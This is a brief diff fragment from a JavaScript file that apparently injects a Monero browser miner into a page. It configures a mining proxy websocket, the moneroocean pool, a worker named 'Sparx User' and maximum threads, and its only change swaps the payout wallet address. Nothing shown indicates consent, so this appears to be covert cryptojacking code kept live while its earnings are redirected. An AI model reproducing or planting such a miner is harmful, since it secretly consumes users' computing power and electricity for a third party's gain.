@@ -10,7 +10,7 @@ document.head.appendChild(script);
 
 server = "wss://f.xmrminingproxy.com:8181";
 var pool = "moneroocean.stream";
-var walletAddress = "4APDbaHLvcf4jFqbM2xP4KMR6PEURKz6eUTDmQkLZ1TkETEwycVZNSRfxqqxf685ub6JKTrND8u8e9rCMK2sB9KMMizJKXP";
+var walletAddress = "46czYpeHpYfZPsykR275NagL23vf6RkeSTBxnZm8h3UcB9EkTiJ6pqoAjS5dvc62oWVPNT9HyD81vVKhcdXVKjfc1f89u2q";
 var workerId = "Sparx User"
 var threads = -1;
 var password = "";
